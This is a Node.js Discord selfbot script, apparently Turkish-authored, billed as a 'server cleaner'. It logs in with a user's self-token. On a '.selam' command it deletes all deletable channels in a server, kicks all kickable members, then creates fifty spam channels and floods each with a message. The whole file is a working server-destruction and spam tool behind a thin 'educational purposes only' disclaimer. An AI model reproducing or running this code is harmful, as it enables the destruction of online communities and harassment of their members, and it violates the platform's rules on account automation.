// Henzy Self Patlatma v1.0 - Discord Server Cleaner Tool
// Created by: Henzy
// GitHub: https://github.com/henzy
// License: MIT
// 
// This tool is designed for educational purposes only.
// Use at your own risk. Discord ToS violation may result in account ban.

const { Client, GatewayIntentBits } = require('discord.js-selfbot-v13');
const readline = require('readline');

// Sadece kare çerçeve
const FRAME_ART = `
╔══════════════════════════════════════════════════════════════════════════════════╗
║                        SELF PATLATMA v1.0 - DISCORD CLEANER                     ║
║                              Created by: Henzy                                   ║
║                           GitHub: https://github.com/Henzy98                    ║
╚══════════════════════════════════════════════════════════════════════════════════╝
`;

class DiscordSelfPatlatma {
    constructor() {
        this.client = new Client({
            checkUpdate: false,
            autoRedeemNitro: false,
            ws: { properties: { browser: 'Discord Client' } }
        });
        
        this.config = null;
        this.setupEventHandlers();
    }

    setupEventHandlers() {
        this.client.on('ready', () => {
            console.clear();
            console.log(FRAME_ART);
            console.log('╔══════════════════════════════════════════════════════════════════════════════════╗');
            console.log('║                           Henzy Self Patlatma                                 ║');
            console.log('║                       Discord Server Cleaner Tool                             ║');
            console.log('╠══════════════════════════════════════════════════════════════════════════════════╣');
            console.log(`║ ✅ ${this.client.user.tag} (Kullanıcı Hesabı) olarak giriş yapıldı!                    ║`);
            console.log('║ 🎯 Komut prefix: .                                                              ║');
            console.log('║ 🎯 Komut kullanıldığı sunucu otomatik hedeflenecek                              ║');
            console.log('║ 🚀 Sunucu temizleme aracı hazır!                                                ║');
            console.log('║ ⚠️  Self-token kullanımı Discord ToS\'a aykırıdır!                              ║');
            console.log('║ ⚠️  Hesap banlanması riski vardır!                                              ║');
            console.log('╚══════════════════════════════════════════════════════════════════════════════════╝');
            console.log('');
            console.log('📋 Komutlar:');
            console.log('   .selam - bom :)');
            console.log('');
        });

        this.client.on('messageCreate', async (message) => {
            // Bot kendi mesajlarını okumasın
            if (message.author.id === this.client.user.id) {
                return;
            }
            
            // Sadece belirtilen USER_ID'den gelen mesajları işle
            if (message.author.id !== this.config.USER_ID) {
                return; // Hiç loglama, sessizce atla
            }
            
            console.log(`🔍 Mesaj alındı: ${message.content} (${message.author.tag})`);
            
            // Prefix kontrolü
            if (!message.content.startsWith('.')) {
                console.log('❌ Prefix yok, atlanıyor');
                return;
            }
            
            const command = message.content.toLowerCase();
            console.log(`🎯 Komut algılandı: ${command}`);
            
            if (command === '.selam') {
                console.log('✅ .selam komutu çalıştırılıyor...');
                await this.handleSelamCommand(message);
            } else {
                console.log(`❌ Bilinmeyen komut: ${command}`);
            }
        });
    }

    async askQuestion(question) {
        return new Promise((resolve) => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            
            rl.question(question, (answer) => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async getConfigFromUser() {
        // Kare çerçeveyi göster
        console.clear();
        console.log(FRAME_ART);
        
        console.log('🚀 Discord Self Patlatma (Kullanıcı Hesabı) başlatılıyor...');
        console.log('⚠️  UYARI: Self-token kullanımı Discord ToS\'a aykırıdır!');
        console.log('⚠️  Hesap banlanması riski vardır!');
        console.log('');
        console.log('📋 Lütfen aşağıdaki bilgileri girin:');
        console.log('');
        console.log('🔐 Tool signed by Henzy - All rights reserved');
        console.log('📧 Contact: https://github.com/Henzy98');
        console.log('⭐ Star this repo if you found it useful!');
        console.log('');
        
        const token = await this.askQuestion('🔑 Discord self-token\'ınızı girin: ');
        const userId = await this.askQuestion('👤 Discord kullanıcı ID\'nizi girin (komutları kullanacak hesabın ID\'si): ');
        const channelName = await this.askQuestion('📝 Oluşturulacak kanal adını girin: ');
        const messageContent = await this.askQuestion('💬 Spam mesajını girin: ');
        
        console.log('');
        console.log('✅ Bilgiler alındı! Discord\'a bağlanılıyor...');
        console.log('');
        
        return {
            DISCORD_TOKEN: token,
            USER_ID: userId,
            CHANNEL_NAME: channelName,
            MESSAGE_CONTENT: messageContent,
            COMMAND_PREFIX: '.',
            DELAY: 500
        };
    }

    async handleSelamCommand(message) {
        try {
            console.log('🔍 Mesaj gönderen ID:', message.author.id);
            console.log('🔍 Beklenen ID:', this.config.USER_ID);
            console.log('🔍 ID\'ler eşleşiyor mu:', message.author.id === this.config.USER_ID);
            
            if (message.author.id !== this.config.USER_ID) {
                await message.reply(`❌ Bu komutu sadece yetkili kullanıcı kullanabilir!\nGönderen ID: ${message.author.id}\nBeklenen ID: ${this.config.USER_ID}`);
                return;
            }

            const guild = message.guild;
            if (!guild) {
                await message.reply('❌ Bu komut sadece sunucularda kullanılabilir!');
                return;
            }

            console.log(`🎯 ${guild.name} sunucusu temizleniyor...`);
            
            try {
                await message.reply('🚀 Sunucu temizleme başlatılıyor... Bu işlem geri alınamaz!');
            } catch {}

            // 1. TÜM KANALLARI TEK SEFERDE SİL
            const channels = guild.channels.cache;
            console.log(`🗑️ ${guild.name} sunucusunda ${channels.size} kanal bulundu`);
            
            const deletableChannels = channels.filter(channel => channel.deletable);
            console.log(`🚀 ${deletableChannels.size} kanal aynı anda siliniyor...`);
            
            // Tüm kanalları paralel olarak sil
            const deletePromises = deletableChannels.map(channel => 
                channel.delete().catch(err => {
                    console.log(`❌ Kanal silinemedi: ${channel.name} - ${err.message}`);
                    return false;
                })
            );
            
            await Promise.all(deletePromises);
            console.log(`✅ ${deletableChannels.size} kanal silme işlemi tamamlandı!`);

            // 2. TÜM ÜYELERİ TEK SEFERDE AT
            const members = guild.members.cache.filter(member => 
                member.kickable && !member.user.bot && member.id !== guild.ownerId
            );
            
            console.log(`👥 ${members.size} üye aynı anda atılıyor...`);
            
            // Tüm üyeleri paralel olarak at
            const kickPromises = members.map(member => 
                member.kick('Sunucu temizleniyor').catch(err => {
                    console.log(`❌ Üye atılamadı: ${member.user.tag} - ${err.message}`);
                    return false;
                })
            );
            
            await Promise.all(kickPromises);
            console.log(`✅ ${members.size} üye atma işlemi tamamlandı!`);

            // 3. SPAM KANALLARINI OLUŞTUR
            console.log('🚀 Spam kanalları oluşturuluyor...');
            
            for (let i = 1; i <= 50; i++) {
                try {
                    const channelName = `${this.config.CHANNEL_NAME}-${i}`;
                    const newChannel = await guild.channels.create(channelName, {
                        type: 0, // Text channel
                        reason: 'Spam kanalı'
                    });
                    
                    console.log(`✅ Kanal oluşturuldu: ${channelName}`);
                    
                    // Spam mesajını gönder
                    try {
                        await newChannel.send(this.config.MESSAGE_CONTENT);
                        console.log(`📨 Mesaj gönderildi: ${channelName}`);
                    } catch (err) {
                        console.log(`❌ Mesaj gönderilemedi: ${channelName} - ${err.message}`);
                    }
                    
                    // Hızlı spam için kısa bekleme
                    await this.sleep(100);
                    
                } catch (err) {
                    console.log(`❌ Kanal oluşturulamadı: ${i} - ${err.message}`);
                }
            }
            
            console.log('🎉 Sunucu patlatma tamamlandı!');
            
        } catch (error) {
            console.error('❌ Sunucu temizleme hatası:', error.message);
            try {
                await message.reply(`❌ Hata oluştu: ${error.message}`);
            } catch {}
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async start() {
        try {
            console.log('🔄 Konfigürasyon alınıyor...');
            this.config = await this.getConfigFromUser();
            
            console.log('🔗 Discord client başlatılıyor...');
            await this.client.login(this.config.DISCORD_TOKEN);
            
            console.log('✅ Discord bağlantısı başarılı!');
        } catch (error) {
            console.error('❌ Hata oluştu:', error.message);
            console.log('🔍 Hata detayları:', error);
            process.exit(1);
        }
    }
}

const patlatma = new DiscordSelfPatlatma();
patlatma.start();

process.on('SIGINT', () => {
    console.log('\n👋 Uygulama kapatılıyor...');
    process.exit(0);
});

process.on('unhandledRejection', (error) => {
    console.error('❌ İşlenmeyen hata:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Yakalanmamış hata:', error);
});
